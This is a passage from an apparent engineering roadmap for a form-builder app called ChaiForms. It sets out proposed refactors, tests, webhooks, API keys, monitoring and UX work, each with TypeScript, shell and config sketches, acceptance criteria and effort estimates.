         expect(form.accessPasswordHash).toBeDefined();
         expect(form.accessPasswordHash).not.toBe("newpassword123");
       });

       it("should throw on duplicate slug", async () => {
         await expect(
           formsService.updateForm("form-123", {
             slug: "existing-slug",
           }),
         ).rejects.toThrow("Slug already in use");
       });
     });
   });
   ```

**Acceptance Criteria:**

- [ ] All business logic extracted to service layer
- [ ] Services are framework-agnostic (no tRPC dependencies)
- [ ] 100% unit test coverage for services
- [ ] tRPC procedures are thin wrappers around services
- [ ] Services can be used in background jobs, CLI tools

**Estimated Effort:** 24 hours  
**Impact:** Testable, reusable business logic

---

### 🗄️ Implement Repository Pattern

**Current State:** Raw Drizzle queries scattered across codebase

**Implementation:**

```typescript
// packages/database/repositories/forms.repository.ts
import { db, eq, and, isNull, desc } from "../index";
import { formsTable } from "../schema";
import type { SelectForm, InsertForm } from "../models/form";

export class FormsRepository {
  async findById(id: string): Promise<SelectForm | null> {
    const [form] = await db.select().from(formsTable).where(eq(formsTable.id, id)).limit(1);
    return form || null;
  }

  async findBySlug(slug: string): Promise<SelectForm | null> {
    const [form] = await db
      .select()
      .from(formsTable)
      .where(and(eq(formsTable.slug, slug), isNull(formsTable.deletedAt)))
      .limit(1);
    return form || null;
  }

  async findByCreator(
    creatorId: string,
    options: { includeDeleted?: boolean } = {},
  ): Promise<SelectForm[]> {
    const conditions = [eq(formsTable.creatorId, creatorId)];

    if (!options.includeDeleted) {
      conditions.push(isNull(formsTable.deletedAt));
    }

    return db
      .select()
      .from(formsTable)
      .where(and(...conditions))
      .orderBy(desc(formsTable.updatedAt));
  }

  async create(data: InsertForm): Promise<SelectForm> {
    const [form] = await db.insert(formsTable).values(data).returning();
    return form!;
  }

  async update(id: string, data: Partial<InsertForm>): Promise<SelectForm> {
    const [form] = await db.update(formsTable).set(data).where(eq(formsTable.id, id)).returning();
    return form!;
  }

  async softDelete(id: string): Promise<void> {
    await db.update(formsTable).set({ deletedAt: new Date() }).where(eq(formsTable.id, id));
  }

  async hardDelete(id: string): Promise<void> {
    await db.delete(formsTable).where(eq(formsTable.id, id));
  }

  async countByCreator(creatorId: string): Promise<number> {
    const [result] = await db
      .select({ count: count() })
      .from(formsTable)
      .where(and(eq(formsTable.creatorId, creatorId), isNull(formsTable.deletedAt)));
    return Number(result?.count ?? 0);
  }
}

export const formsRepository = new FormsRepository();
```

**Acceptance Criteria:**

- [ ] All database queries go through repositories
- [ ] Repositories are testable with in-memory database
- [ ] Complex queries encapsulated in repository methods
- [ ] Services use repositories instead of raw Drizzle

**Estimated Effort:** 16 hours

---

### 🔄 Add Transaction Wrapper Utility

**Current State:** Manual transaction management

**Implementation:**

```typescript
// packages/database/transaction.ts
import { db } from "./index";
import type { PgTransaction } from "drizzle-orm/pg-core";

export async function withTransaction<T>(callback: (tx: PgTransaction) => Promise<T>): Promise<T> {
  return db.transaction(async (tx) => {
    try {
      return await callback(tx);
    } catch (error) {
      // Transaction automatically rolled back
      throw error;
    }
  });
}

// Usage example
export async function cloneFormWithPages(formId: string, userId: string) {
  return withTransaction(async (tx) => {
    // Clone form
    const [newForm] = await tx
      .insert(formsTable)
      .values({
        /* ... */
      })
      .returning();

    // Clone pages
    const pages = await tx.select().from(pagesTable).where(eq(pagesTable.formId, formId));

    if (pages.length > 0) {
      await tx.insert(pagesTable).values(
        pages.map((p) => ({
          formId: newForm.id,
          title: p.title,
          order: p.order,
          fieldIds: p.fieldIds,
        })),
      );
    }

    return newForm;
  });
}
```

**Acceptance Criteria:**

- [ ] All multi-step operations use transactions
- [ ] Automatic rollback on error
- [ ] Nested transactions supported

**Estimated Effort:** 4 hours

---

### 🔐 Add Middleware for Ownership Checks

**Current State:** `assertOwnership` duplicated across procedures

**Implementation:**

```typescript
// packages/trpc/server/middleware/ownership.ts
import { TRPCError } from "@trpc/server";
import { formsRepository } from "@repo/database/repositories";

export const formOwnershipMiddleware = tRPCContext.middleware(
  async ({ ctx, next, getRawInput }) => {
    const input = (await getRawInput()) as { formId?: string };

    if (!input?.formId) {
      throw new TRPCError({
        code: "BAD_REQUEST",
        message: "formId is required",
      });
    }

    const form = await formsRepository.findById(input.formId);

    if (!form) {
      throw new TRPCError({
        code: "NOT_FOUND",
        message: "Form not found",
      });
    }

    if (form.creatorId !== ctx.user!.id) {
      throw new TRPCError({
        code: "FORBIDDEN",
        message: "You do not have access to this form",
      });
    }

    return next({
      ctx: {
        ...ctx,
        form, // Pass form to procedure
      },
    });
  },
);

export const formOwnerProcedure = protectedProcedure.use(formOwnershipMiddleware);

// Usage
export const formsRouter = router({
  update: formOwnerProcedure
    .input(z.object({ formId: z.string().uuid() }).merge(formSettingsSchema))
    .mutation(async ({ input, ctx }) => {
      // ctx.form is guaranteed to exist and be owned by user
      const form = await formsService.updateForm(ctx.form.id, input);
      return mapForm(form);
    }),
});
```

**Acceptance Criteria:**

- [ ] No duplicated ownership checks
- [ ] Middleware reusable across routers
- [ ] Form preloaded in context

**Estimated Effort:** 4 hours

---

## 5. Frontend Performance & UX (P1)

### ⚡ Implement Code Splitting

**Current State:** Entire app in single bundle

**Implementation:**

```typescript
// apps/web/app/dashboard/forms/[id]/builder/page.tsx
import dynamic from "next/dynamic";
import { Suspense } from "react";

// Lazy load heavy components
const FormBuilder = dynamic(
  () => import("~/components/form-builder/form-builder"),
  {
    loading: () => <FormBuilderSkeleton />,
    ssr: false, // Builder doesn't need SSR
  }
);

const FieldPalette = dynamic(
  () => import("~/components/form-builder/field-palette"),
  { loading: () => <PaletteSkeleton /> }
);

export default function BuilderPage() {
  return (
    <Suspense fallback={<PageSkeleton />}>
      <div className="flex h-screen">
        <FieldPalette />
        <FormBuilder />
      </div>
    </Suspense>
  );
}
```

**Acceptance Criteria:**

- [ ] Initial bundle < 200KB gzipped
- [ ] Form builder lazy loaded
- [ ] Analytics charts lazy loaded
- [ ] Lighthouse score > 90

**Estimated Effort:** 8 hours

---

### 🎨 Add Loading Skeletons

**Current State:** Only spinners for loading states

**Implementation:**

```typescript
// apps/web/components/skeletons/form-card-skeleton.tsx
export function FormCardSkeleton() {
  return (
    <div className="rounded-xl border border-white/10 bg-gray-800/50 p-6 animate-pulse">
      <div className="flex items-start justify-between mb-4">
        <div className="h-6 w-24 bg-gray-700 rounded" />
        <div className="h-8 w-8 bg-gray-700 rounded-full" />
      </div>
      <div className="h-8 w-3/4 bg-gray-700 rounded mb-2" />
      <div className="h-4 w-full bg-gray-700 rounded mb-1" />
      <div className="h-4 w-2/3 bg-gray-700 rounded" />
      <div className="flex items-center gap-4 mt-6">
        <div className="h-4 w-20 bg-gray-700 rounded" />
        <div className="h-4 w-20 bg-gray-700 rounded" />
      </div>
    </div>
  );
}

// Usage
export default function DashboardPage() {
  const { data: forms, isLoading } = trpc.forms.list.useQuery();

  if (isLoading) {
    return (
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {Array.from({ length: 6 }).map((_, i) => (
          <FormCardSkeleton key={i} />
        ))}
      </div>
    );
  }

  return <FormsList forms={forms} />;
}
```

**Acceptance Criteria:**

- [ ] All loading states use skeletons
- [ ] Skeletons match final content layout
- [ ] No layout shift on load

**Estimated Effort:** 6 hours

---

### 🖼️ Optimize Images with next/image

**Current State:** Images loaded without optimization

**Implementation:**

```typescript
// apps/web/app/page.tsx
import Image from "next/image";

<Image
  src="/hero-illustration.png"
  alt="Form builder illustration"
  width={800}
  height={600}
  priority // Above fold
  placeholder="blur"
  blurDataURL="data:image/jpeg;base64,..."
/>

// Configure next.config.js
export default {
  images: {
    domains: ["chaiforms.dev"],
    formats: ["image/avif", "image/webp"],
    deviceSizes: [640, 750, 828, 1080, 1200, 1920, 2048, 3840],
  },
};
```

**Acceptance Criteria:**

- [ ] All images use next/image
- [ ] AVIF/WebP formats served
- [ ] Lazy loading for below-fold images
- [ ] Blur placeholders for hero images

**Estimated Effort:** 4 hours

---

### 🚀 Add Virtual Scrolling for Long Lists

**Current State:** Dashboard lags with 100+ forms

**Implementation:**

```typescript
// apps/web/components/dashboard/forms-list-virtualized.tsx
import { useVirtualizer } from "@tanstack/react-virtual";
import { useRef } from "react";

export function FormsListVirtualized({ forms }: { forms: Form[] }) {
  const parentRef = useRef<HTMLDivElement>(null);

  const virtualizer = useVirtualizer({
    count: forms.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 200, // Estimated row height
    overscan: 5, // Render 5 extra items
  });

  return (
    <div ref={parentRef} className="h-screen overflow-auto">
      <div
        style={{
          height: `${virtualizer.getTotalSize()}px`,
          position: "relative",
        }}
      >
        {virtualizer.getVirtualItems().map((virtualRow) => {
          const form = forms[virtualRow.index]!;
          return (
            <div
              key={virtualRow.key}
              style={{
                position: "absolute",
                top: 0,
                left: 0,
                width: "100%",
                height: `${virtualRow.size}px`,
                transform: `translateY(${virtualRow.start}px)`,
              }}
            >
              <FormCard form={form} />
            </div>
          );
        })}
      </div>
    </div>
  );
}
```

**Acceptance Criteria:**

- [ ] Dashboard renders 1000+ forms smoothly
- [ ] Only visible items rendered
- [ ] Scroll performance 60fps

**Estimated Effort:** 6 hours

---

### 🎯 Add Error Boundaries

**Current State:** Unhandled errors crash entire app

**Implementation:**

```typescript
// apps/web/components/error-boundary.tsx
"use client";

import { Component, type ReactNode } from "react";
import * as Sentry from "@sentry/nextjs";

interface Props {
  children: ReactNode;
  fallback?: ReactNode;
}

interface State {
  hasError: boolean;
  error?: Error;
}

export class ErrorBoundary extends Component<Props, State> {
  constructor(props: Props) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error: Error): State {
    return { hasError: true, error };
  }

  componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
    Sentry.captureException(error, {
      contexts: { react: { componentStack: errorInfo.componentStack } },
    });
  }

  render() {
    if (this.state.hasError) {
      return (
        this.props.fallback || (
          <div className="flex min-h-screen items-center justify-center">
            <div className="text-center">
              <h2 className="text-2xl font-bold mb-4">Something went wrong</h2>
              <p className="text-gray-400 mb-6">
                We've been notified and are working on a fix.
              </p>
              <button
                onClick={() => this.setState({ hasError: false })}
                className="px-4 py-2 bg-orange-500 rounded-lg"
              >
                Try again
              </button>
            </div>
          </div>
        )
      );
    }

    return this.props.children;
  }
}

// Usage in layout
export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        <ErrorBoundary>
          {children}
        </ErrorBoundary>
      </body>
    </html>
  );
}
```

**Acceptance Criteria:**

- [ ] Error boundaries at route level
- [ ] Errors sent to Sentry
- [ ] User-friendly error messages
- [ ] Retry functionality

**Estimated Effort:** 4 hours

---

## 6. Monorepo & Build Optimization (P2)

### 📦 Extract Shared UI Component Library

**Current State:** UI components scattered in `apps/web/components/ui`

**Implementation:**

```bash
# Create new package
mkdir -p packages/ui
cd packages/ui
pnpm init

# Move components
mv apps/web/components/ui/* packages/ui/src/

# Add Storybook
pnpm add -D @storybook/react @storybook/nextjs storybook
npx storybook init
```

```typescript
// packages/ui/package.json
{
  "name": "@repo/ui",
  "version": "1.0.0",
  "main": "./src/index.ts",
  "types": "./src/index.ts",
  "scripts": {
    "storybook": "storybook dev -p 6006",
    "build-storybook": "storybook build"
  },
  "dependencies": {
    "@radix-ui/react-dialog": "^1.1.15",
    "@radix-ui/react-dropdown-menu": "^2.1.16",
    "class-variance-authority": "^0.7.1",
    "clsx": "^2.1.1",
    "tailwind-merge": "^3.4.0"
  }
}
```

```typescript
// packages/ui/src/button.stories.tsx
import type { Meta, StoryObj } from "@storybook/react";
import { Button } from "./button";

const meta: Meta<typeof Button> = {
  title: "Components/Button",
  component: Button,
  tags: ["autodocs"],
  argTypes: {
    variant: {
      control: "select",
      options: ["default", "destructive", "outline", "ghost"],
    },
  },
};

export default meta;
type Story = StoryObj<typeof Button>;

export const Default: Story = {
  args: {
    children: "Click me",
    variant: "default",
  },
};

export const Destructive: Story = {
  args: {
    children: "Delete",
    variant: "destructive",
  },
};
```

**Acceptance Criteria:**

- [ ] All UI components in `@repo/ui`
- [ ] Storybook running at localhost:6006
- [ ] All components documented
- [ ] Visual regression tests with Chromatic

**Estimated Effort:** 12 hours

---

### 🔄 Implement Changesets for Versioning

**Current State:** All packages at version 1.0.0

**Implementation:**

```bash
pnpm add -D @changesets/cli
pnpm changeset init
```

```yaml
# .changeset/config.json
{
  "changelog": "@changesets/cli/changelog",
  "commit": false,
  "fixed": [],
  "linked": [],
  "access": "restricted",
  "baseBranch": "main",
  "updateInternalDependencies": "patch",
  "ignore": [],
}
```

```bash
# Workflow: Making a change
pnpm changeset
# Select packages that changed
# Select version bump type (major/minor/patch)
# Write changelog entry

# Before release
pnpm changeset version  # Updates package.json versions
pnpm install            # Update lockfile
git commit -am "Version packages"

# Release
pnpm changeset publish
```

**Acceptance Criteria:**

- [ ] Changesets configured
- [ ] Version bumps automated
- [ ] Changelog generated automatically
- [ ] CI enforces changeset on PRs

**Estimated Effort:** 4 hours

---

### 🚀 Add Turbo Remote Caching

**Current State:** Local caching only

**Implementation:**

```bash
# Sign up for Vercel (free tier includes Turbo cache)
npx turbo login
npx turbo link
```

```json
// turbo.json
{
  "$schema": "https://turborepo.com/schema.json",
  "ui": "tui",
  "remoteCache": {
    "signature": true
  },
  "tasks": {
    "build": {
      "dependsOn": ["^build"],
      "outputs": [".next/**", "dist/**"],
      "cache": true
    }
  }
}
```

```yaml
# .github/workflows/ci.yml
- name: Build with remote cache
  run: pnpm turbo build
  env:
    TURBO_TOKEN: ${{ secrets.TURBO_TOKEN }}
    TURBO_TEAM: ${{ secrets.TURBO_TEAM }}
```

**Acceptance Criteria:**

- [ ] Remote cache enabled
- [ ] CI builds use remote cache
- [ ] Build times reduced by 50%+

**Estimated Effort:** 2 hours

---

### 🗂️ Create @repo/types Package

**Current State:** Types scattered across packages

**Implementation:**

```typescript
// packages/types/src/index.ts
export type FormId = string & { readonly __brand: "FormId" };
export type UserId = string & { readonly __brand: "UserId" };
export type ResponseId = string & { readonly __brand: "ResponseId" };

export function FormId(id: string): FormId {
  return id as FormId;
}

export function UserId(id: string): UserId {
  return id as UserId;
}

// Domain types
export interface PaginationParams {
  page: number;
  pageSize: number;
}

export interface PaginatedResponse<T> {
  items: T[];
  total: number;
  page: number;
  pageSize: number;
  hasMore: boolean;
}

export type Result<T, E = Error> = { success: true; data: T } | { success: false; error: E };
```

**Acceptance Criteria:**

- [ ] All shared types in `@repo/types`
- [ ] Branded types for IDs
- [ ] No type duplication

**Estimated Effort:** 6 hours

---

## 7. API & Integration Improvements (P2)

### 🔗 Add Webhook System

**Current State:** No way to notify external systems

**Implementation:**

```typescript
// packages/database/models/webhook.ts
export const webhooksTable = pgTable("webhooks", {
  id: uuid("id").primaryKey().defaultRandom(),
  formId: uuid("form_id")
    .notNull()
    .references(() => formsTable.id, { onDelete: "cascade" }),
  url: text("url").notNull(),
  events: jsonb("events").$type<string[]>().notNull(), // ["response.created", "form.published"]
  secret: text("secret").notNull(), // For HMAC signature
  enabled: boolean("enabled").default(true).notNull(),
  createdAt: timestamp("created_at").defaultNow(),
});
```

```typescript
// packages/services/webhooks/webhook.service.ts
import crypto from "crypto";

export class WebhookService {
  async triggerWebhook(formId: string, event: string, payload: unknown): Promise<void> {
    const webhooks = await db
      .select()
      .from(webhooksTable)
      .where(and(eq(webhooksTable.formId, formId), eq(webhooksTable.enabled, true)));

    const relevantWebhooks = webhooks.filter((w) => (w.events as string[]).includes(event));

    await Promise.allSettled(
      relevantWebhooks.map((webhook) => this.sendWebhook(webhook, event, payload)),
    );
  }

  private async sendWebhook(
    webhook: SelectWebhook,
    event: string,
    payload: unknown,
  ): Promise<void> {
    const body = JSON.stringify({
      event,
      timestamp: new Date().toISOString(),
      data: payload,
    });

    const signature = crypto.createHmac("sha256", webhook.secret).update(body).digest("hex");

    try {
      const response = await fetch(webhook.url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-ChaiForms-Signature": signature,
          "X-ChaiForms-Event": event,
        },
        body,
      });

      if (!response.ok) {
        throw new Error(`Webhook failed: ${response.status}`);
      }

      logger.info("Webhook delivered", {
        webhookId: webhook.id,
        event,
        status: response.status,
      });
    } catch (error) {
      logger.error("Webhook delivery failed", {
        webhookId: webhook.id,
        event,
        error,
      });

      // TODO: Implement retry queue
    }
  }
}

export const webhookService = new WebhookService();
```

```typescript
// Trigger on form submission
submit: publicProcedure
  .mutation(async ({ input, ctx }) => {
    // ... create response ...

    // Trigger webhook
    await webhookService.triggerWebhook(
      form.id,
      "response.created",
      {
        formId: form.id,
        responseId: response.id,
        submittedAt: response.submittedAt,
      }
    );
  }),
```

**Acceptance Criteria:**

- [ ] Webhooks can be created via UI
- [ ] HMAC signature for security
- [ ] Retry logic with exponential backoff
- [ ] Webhook logs for debugging

**Estimated Effort:** 16 hours

---

### 🔑 Add API Keys for Programmatic Access

**Current State:** Only JWT auth, no API keys

**Implementation:**

```typescript
// packages/database/models/api-key.ts
export const apiKeysTable = pgTable("api_keys", {
  id: uuid("id").primaryKey().defaultRandom(),
  userId: uuid("user_id")
    .notNull()
    .references(() => usersTable.id, { onDelete: "cascade" }),
  name: varchar("name", { length: 100 }).notNull(),
  keyHash: text("key_hash").notNull(), // Hash of the key
  keyPrefix: varchar("key_prefix", { length: 8 }).notNull(), // For display
  lastUsedAt: timestamp("last_used_at"),
  expiresAt: timestamp("expires_at"),
  createdAt: timestamp("created_at").defaultNow(),
});
```

```typescript
// packages/trpc/server/utils/api-key.ts
import crypto from "crypto";

export function generateApiKey(): { key: string; hash: string; prefix: string } {
  const key = `cf_${crypto.randomBytes(32).toString("hex")}`;
  const hash = crypto.createHash("sha256").update(key).digest("hex");
  const prefix = key.slice(0, 11); // "cf_xxxxxxxx"

  return { key, hash, prefix };
}

export async function verifyApiKey(key: string): Promise<SelectUser | null> {
  const hash = crypto.createHash("sha256").update(key).digest("hex");

  const [apiKey] = await db
    .select()
    .from(apiKeysTable)
    .where(eq(apiKeysTable.keyHash, hash))
    .limit(1);

  if (!apiKey) return null;

  // Check expiry
  if (apiKey.expiresAt && apiKey.expiresAt < new Date()) {
    return null;
  }

  // Update last used
  await db
    .update(apiKeysTable)
    .set({ lastUsedAt: new Date() })
    .where(eq(apiKeysTable.id, apiKey.id));

  // Get user
  const [user] = await db
    .select()
    .from(usersTable)
    .where(eq(usersTable.id, apiKey.userId))
    .limit(1);

  return user || null;
}
```

```typescript
// Update context to check API key
export async function createContext({ req, res }: CreateExpressContextOptions) {
  let user: SelectUser | null = null;

  // 1. Try API key (Authorization: Bearer cf_xxx)
  const authHeader = req.headers.authorization;
  if (authHeader?.startsWith("Bearer cf_")) {
    const apiKey = authHeader.slice(7);
    user = await verifyApiKey(apiKey);
    if (user) return { user, req, res };
  }

  // 2. Try JWT (existing logic)
  // ...
}
```

**Acceptance Criteria:**

- [ ] API keys can be created in dashboard
- [ ] Keys are hashed, never stored plaintext
- [ ] Keys can be revoked
- [ ] Rate limiting per API key
- [ ] Usage analytics per key

**Estimated Effort:** 12 hours

---

### 📖 Add API Versioning

**Current State:** No versioning, breaking changes will hurt clients

**Implementation:**

```typescript
// packages/trpc/server/index.ts
import { router as v1Router } from "./v1";
import { router as v2Router } from "./v2";

export const serverRouter = router({
  v1: v1Router,
  v2: v2Router,
});

// apps/api/src/server.ts
app.use(
  "/api/v1",
  createOpenApiExpressMiddleware({
    router: serverRouter.v1,
    createContext,
  }),
);

app.use(
  "/api/v2",
  createOpenApiExpressMiddleware({
    router: serverRouter.v2,
    createContext,
  }),
);
```

**Acceptance Criteria:**

- [ ] v1 and v2 APIs coexist
- [ ] Deprecation warnings in v1
- [ ] Migration guide for v1 → v2

**Estimated Effort:** 8 hours

---

## 8. Testing & Quality Assurance (P2)

### 🧪 Add E2E Tests with Playwright

**Current State:** No E2E tests

**Implementation:**

```bash
pnpm add -D @playwright/test
npx playwright install
```

```typescript
// apps/web/e2e/form-submission.spec.ts
import { test, expect } from "@playwright/test";

test.describe("Form Submission Flow", () => {
  test("should submit anime form successfully", async ({ page }) => {
    // Navigate to form
    await page.goto("/f/which-anime-character-are-you");

    // Fill first page
    await page.getByLabel("What's your anime genre preference?").click();
    await page.getByRole("option", { name: "Shonen" }).click();

    await page.getByLabel("Choose your fighting style").click();
    await page.getByRole("option", { name: "Speed" }).click();

    await page.getByLabel("How important is friendship in anime?").fill("8");

    // Next page
    await page.getByRole("button", { name: "Next" }).click();

    // Fill second page
    await page.getByLabel("Which anime have you watched?").click();
    await page.getByRole("option", { name: "Naruto" }).click();
    await page.getByRole("option", { name: "One Piece" }).click();

    await page
      .getByLabel("What would your anime character's special move be called?")
      .fill("Lightning Strike");

    await page.getByLabel("Your email (for character reveal)").fill("test@example.com");

    // Submit
    await page.getByRole("button", { name: "Submit" }).click();

    // Verify thank you message
    await expect(page.getByText("Thank you for your response!")).toBeVisible();
  });

  test("should validate required fields", async ({ page }) => {
    await page.goto("/f/which-anime-character-are-you");

    // Try to submit without filling
    await page.getByRole("button", { name: "Next" }).click();

    // Should show validation error
    await expect(page.getByText("This field is required")).toBeVisible();
  });
});
```

```typescript
// apps/web/e2e/form-builder.spec.ts
test.describe("Form Builder", () => {
  test.beforeEach(async ({ page }) => {
    // Login as demo user
    await page.goto("/login");
    await page.getByRole("button", { name: "Continue as Demo Creator" }).click();
  });

  test("should create new form", async ({ page }) => {
    await page.goto("/dashboard");
    await page.getByRole("button", { name: "Create Form" }).click();

    await page.getByLabel("Form Title").fill("Test Form");
    await page.getByRole("button", { name: "Create" }).click();

    await expect(page).toHaveURL(/\/dashboard\/forms\/[a-z0-9-]+\/builder/);
  });

  test("should add fields via drag and drop", async ({ page }) => {
    await page.goto("/dashboard/forms/test-form-id/builder");

    // Drag short text field
    const shortTextField = page.getByText("Short Text");
    const dropZone = page.getByTestId("form-canvas");

    await shortTextField.dragTo(dropZone);

    // Verify field added
    await expect(page.getByLabel("Field Label")).toBeVisible();
  });
});
```

**Acceptance Criteria:**

- [ ] E2E tests for critical user flows
- [ ] Tests run in CI
- [ ] Visual regression tests
- [ ] Cross-browser testing (Chrome, Firefox, Safari)

**Estimated Effort:** 20 hours

---

### 🧪 Add Frontend Component Tests

**Current State:** No React component tests

**Implementation:**

```typescript
// apps/web/components/form-builder/field-editor.test.tsx
import { render, screen, fireEvent } from "@testing-library/react";
import { FieldEditor } from "./field-editor";

describe("FieldEditor", () => {
  it("should render field properties", () => {
    const field = {
      id: "field-1",
      type: "short_text",
      label: "Your Name",
      required: true,
    };

    render(<FieldEditor field={field} onChange={() => {}} />);

    expect(screen.getByDisplayValue("Your Name")).toBeInTheDocument();
    expect(screen.getByLabelText("Required")).toBeChecked();
  });

  it("should update field label", () => {
    const onChange = vi.fn();
    const field = {
      id: "field-1",
      type: "short_text",
      label: "Your Name",
      required: false,
    };

    render(<FieldEditor field={field} onChange={onChange} />);

    const labelInput = screen.getByDisplayValue("Your Name");
    fireEvent.change(labelInput, { target: { value: "Full Name" } });

    expect(onChange).toHaveBeenCalledWith({
      ...field,
      label: "Full Name",
    });
  });

  it("should show type-specific options", () => {
    const field = {
      id: "field-1",
      type: "number",
      label: "Age",
      min: 0,
      max: 120,
    };

    render(<FieldEditor field={field} onChange={() => {}} />);

    expect(screen.getByLabelText("Minimum")).toHaveValue(0);
    expect(screen.getByLabelText("Maximum")).toHaveValue(120);
  });
});
```

**Acceptance Criteria:**

- [ ] All critical components tested
- [ ] 80%+ code coverage
- [ ] Tests run in CI
- [ ] Fast test execution (<30s)

**Estimated Effort:** 16 hours

---

### 📊 Add Code Coverage Tracking

**Current State:** No coverage metrics

**Implementation:**

```typescript
// vitest.config.ts
export default defineConfig({
  test: {
    coverage: {
      provider: "v8",
      reporter: ["text", "json", "html", "lcov"],
      exclude: ["node_modules/", "dist/", "**/*.test.ts", "**/*.spec.ts", "**/*.config.ts"],
      thresholds: {
        lines: 80,
        functions: 80,
        branches: 75,
        statements: 80,
      },
    },
  },
});
```

```yaml
# .github/workflows/ci.yml
- name: Run tests with coverage
  run: pnpm test --coverage

- name: Upload coverage to Codecov
  uses: codecov/codecov-action@v3
  with:
    files: ./coverage/lcov.info
    flags: unittests
```

**Acceptance Criteria:**

- [ ] Coverage reports generated
- [ ] Coverage badge in README
- [ ] CI fails if coverage drops below threshold

**Estimated Effort:** 4 hours

---

## 9. Observability & Monitoring (P1)

### 📈 Add Grafana Dashboards

**Current State:** Metrics exposed but not visualized

**Implementation:**

```yaml
# docker-compose.monitoring.yml
version: "3.8"

services:
  prometheus:
    image: prom/prometheus:latest
    ports:
      - "9090:9090"
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus_data:/prometheus
    command:
      - "--config.file=/etc/prometheus/prometheus.yml"
      - "--storage.tsdb.path=/prometheus"

  grafana:
    image: grafana/grafana:latest
    ports:
      - "3001:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
    volumes:
      - grafana_data:/var/lib/grafana
      - ./grafana/dashboards:/etc/grafana/provisioning/dashboards
      - ./grafana/datasources:/etc/grafana/provisioning/datasources

volumes:
  prometheus_data:
  grafana_data:
```

```yaml
# prometheus.yml
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: "chaiforms-api"
    static_configs:
      - targets: ["api:8000"]
    metrics_path: "/metrics"
```

```json
// grafana/dashboards/chaiforms.json
{
  "dashboard": {
    "title": "ChaiForms Metrics",
    "panels": [
      {
        "title": "Request Rate",
        "targets": [
          {
            "expr": "rate(http_request_duration_seconds_count[5m])"
          }
        ]
      },
      {
        "title": "Error Rate",
        "targets": [
          {
            "expr": "rate(http_request_duration_seconds_count{status_code=~\"5..\"}[5m])"
          }
        ]
      },
      {
        "title": "Form Submissions",
        "targets": [
          {
            "expr": "rate(form_submissions_total[5m])"
          }
        ]
      },
      {
        "title": "P95 Latency",
        "targets": [
          {
            "expr": "histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))"
          }
        ]
      }
    ]
  }
}
```

**Acceptance Criteria:**

- [ ] Grafana dashboard showing key metrics
- [ ] Alerts configured for error rate spikes
- [ ] Alerts for high latency
- [ ] Alerts for database connection failures

**Estimated Effort:** 8 hours

---

### 🔔 Add PagerDuty/Opsgenie Alerts

**Current State:** No alerting system

**Implementation:**

```typescript
// packages/services/alerting/alert.service.ts
import { Resend } from "resend";

export class AlertService {
  async sendAlert(alert: {
    severity: "critical" | "warning" | "info";
    title: string;
    description: string;
    metadata?: Record<string, unknown>;
  }) {
    logger.error("Alert triggered", alert);

    // Send to Sentry
    Sentry.captureMessage(alert.title, {
      level: alert.severity === "critical" ? "error" : "warning",
      extra: alert.metadata,
    });

    // Send email to on-call engineer
    if (alert.severity === "critical") {
      await this.sendEmailAlert(alert);
    }

    // Send to Slack
    await this.sendSlackAlert(alert);
  }

  private async sendSlackAlert(alert: any) {
    const webhookUrl = process.env.SLACK_WEBHOOK_URL;
    if (!webhookUrl) return;

    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        text: `🚨 ${alert.title}`,
        blocks: [
          {
            type: "section",
            text: {
              type: "mrkdwn",
              text: `*${alert.title}*\n${alert.description}`,
            },
          },
        ],
      }),
    });
  }
}

export const alertService = new AlertService();
```

```typescript
// apps/api/src/monitoring/health-check.ts
setInterval(async () => {
  try {
    await db.execute(sql`SELECT 1`);
  } catch (error) {
    await alertService.sendAlert({
      severity: "critical",
      title: "Database Connection Failed",
      description: "Unable to connect to PostgreSQL database",
      metadata: { error: error.message },
    });
  }
}, 60_000); // Check every minute
```

**Acceptance Criteria:**

- [ ] Alerts sent to Slack
- [ ] Critical alerts sent to email
- [ ] Alert fatigue minimized (smart grouping)
- [ ] Runbooks linked in alerts

**Estimated Effort:** 6 hours

---

### 📝 Add Structured Logging with Context

**Current State:** Basic console.log statements

**Implementation:**

```typescript
// packages/logger/index.ts (enhanced)
import pino from "pino";

export interface LogContext {
  userId?: string;
  formId?: string;
  responseId?: string;
  correlationId?: string;
  [key: string]: unknown;
}

class Logger {
  private logger: pino.Logger;

  constructor() {
    this.logger = pino({
      level: process.env.LOG_LEVEL || "info",
      formatters: {
        level: (label) => ({ level: label }),
      },
      timestamp: pino.stdTimeFunctions.isoTime,
      ...(process.env.NODE_ENV === "production"
        ? {
            // JSON in production
          }
        : {
            transport: {
              target: "pino-pretty",
              options: {
                colorize: true,
                translateTime: "SYS:standard",
                ignore: "pid,hostname",
              },
            },
          }),
    });
  }

  child(context: LogContext) {
    return this.logger.child(context);
  }

  info(message: string, context?: LogContext) {
    this.logger.info(context, message);
  }

  error(message: string, context?: LogContext & { error?: Error }) {
    this.logger.error(context, message);
  }

  warn(message: string, context?: LogContext) {
    this.logger.warn(context, message);
  }

  debug(message: string, context?: LogContext) {
    this.logger.debug(context, message);
  }
}

export const logger = new Logger();

// Usage
logger.info("Form created", {
  userId: "user-123",
  formId: "form-456",
  correlationId: req.correlationId,
});
```

**Acceptance Criteria:**

- [ ] All logs include correlation ID
- [ ] Logs include user/form/response context
- [ ] Logs searchable in production (CloudWatch/Datadog)
- [ ] Log levels configurable per environment

**Estimated Effort:** 4 hours

---

## 10. Product & UX Polish (P2)

### 🎓 Add Interactive Onboarding Tour

**Current State:** No user onboarding

**Implementation:**

```bash
pnpm add intro.js intro.js-react
```

```typescript
// apps/web/components/onboarding/dashboard-tour.tsx
import { Steps } from "intro.js-react";
import "intro.js/introjs.css";

export function DashboardTour({ enabled, onExit }: Props) {
  const steps = [
    {
      element: "#create-form-button",
      intro: "Click here to create your first form",
      position: "bottom",
    },
    {
      element: "#forms-list",
      intro: "Your forms will appear here. You can edit, preview, or view analytics.",
      position: "top",
    },
    {
      element: "#explore-link",
      intro: "Browse public forms created by the community for inspiration.",
      position: "left",
    },
  ];

  return (
